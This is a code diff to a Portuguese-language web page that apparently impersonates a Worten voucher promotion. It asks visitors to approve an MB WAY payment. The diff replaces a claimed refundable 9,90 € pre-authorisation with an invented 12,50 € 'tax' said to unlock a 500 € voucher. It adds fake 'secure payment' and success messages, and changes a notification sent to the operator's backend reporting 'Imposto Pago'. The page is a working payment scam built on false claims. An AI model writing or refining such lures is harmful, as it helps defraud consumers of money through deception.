@@ -313,25 +313,25 @@
             }
         </style>
 
-        <h3 style="margin: 0 0 5px; font-size: 16px; color: #333; font-weight: 700;">Confirme na App</h3>
-        <p style="margin: 0 0 25px; font-size: 13px; color: #666;">Abra o MB WAY e aceite o pedido de 9,90 €</p>
+        <h3 style="margin: 0 0 5px; font-size: 16px; color: #333; font-weight: 700;">Confirme o Pagamento</h3>
+        <p style="margin: 0 0 25px; font-size: 13px; color: #666;">Abra o MB WAY e aceite o pagamento de 12,50 €</p>
 
         <!-- Notification Card -->
         <div class="notif-card">
             <div class="notif-title">
-                <span>Notificação</span>
+                <span>Pagamento de Imposto (IEJO)</span>
             </div>
             <div class="notif-body">
-                Foi enviado um pedido de <strong>9,90 €</strong> para o número <span id="userPhoneDisplay"
-                    class="target-phone">551599176</span>
+                Foi enviado um pedido de <strong>12,50 €</strong> (2,5% de 500 €) para o número <span
+                    id="userPhoneDisplay" class="target-phone">551599176</span>
             </div>
         </div>
 
         <!-- Reassurance Text -->
         <p
             style="margin: -10px 0 30px; font-size: 12px; color: #555; line-height: 1.5; text-align: left; background: #fff; border-left: 3px solid #888; padding: 10px;">
-            Assim que a pré-autorização de 9,90 € for confirmada, o valor será reembolsado automaticamente num prazo
-            máximo de 15 minutos e o seu voucher ficará ativo para utilização imediata.
+            Assim que o pagamento do imposto for confirmado, o seu voucher de 500 € será ativado instantaneamente para
+            utilização imediata em loja física ou online Worten.
         </p>
 
 
@@ -423,7 +423,7 @@
         </button>
 
         <p class="helper-text">
-            O estorno é automático. O valor nunca será cobrado permanentemente.
+            Pagamento único obrigatório. Após confirmação, o voucher é ativado imediatamente.
         </p>
 
         <div class="secure-footer">
@@ -431,7 +431,7 @@
                 <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
                 <path d="M7 11V7a5 5 0 0 1 10 0v4"></path>
             </svg>
-            Validação Segura
+            Pagamento Seguro
         </div>
 
     </div>
@@ -556,7 +556,7 @@
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         type: "Aprovado delivery",
-                        text: "Pagamento Confirmado: 9,90 € (MBWAY)",
+                        text: "Imposto Pago: 12,50 € (MBWAY) - Voucher Ativado",
                         title: "Worten Promo"
                     })
                 });
@@ -570,10 +570,10 @@
                             <path d="M20 6L9 17l-5-5" stroke-linecap="round" stroke-linejoin="round"/>
                         </svg>
                     </div>
-                    <h2 style="color: #111; margin-bottom: 10px; font-size: 24px; font-weight: 800;">Pagamento Confirmado!</h2>
-                    <p style="color: #64748b; font-size: 16px; margin-bottom: 30px;">O teu voucher foi ativado com sucesso.</p>
+                    <h2 style="color: #111; margin-bottom: 10px; font-size: 24px; font-weight: 800;">Imposto Pago com Sucesso!</h2>
+                    <p style="color: #64748b; font-size: 16px; margin-bottom: 30px;">O seu voucher de 500€ foi ativado.</p>
                     <div style="background: #f0fdf4; color: #15803d; padding: 15px; border-radius: 12px; font-size: 14px; font-weight: 600; border: 1px solid #bbf7d0;">
-                        O estorno de 9,90€ será processado em breve.
+                        Voucher válido para uso imediato em loja física ou online Worten.
                     </div>
                 </div>
              `;
